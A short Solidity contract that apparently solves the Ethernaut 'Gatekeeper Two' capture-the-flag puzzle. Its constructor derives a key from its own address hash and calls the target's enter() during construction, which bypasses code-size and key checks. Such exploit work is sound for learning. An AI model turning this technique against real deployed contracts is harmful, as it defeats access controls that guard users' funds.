// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _key) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address _target) {
        unchecked {
            bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
            IGatekeeperTwo(_target).enter(key);
        }
    }
}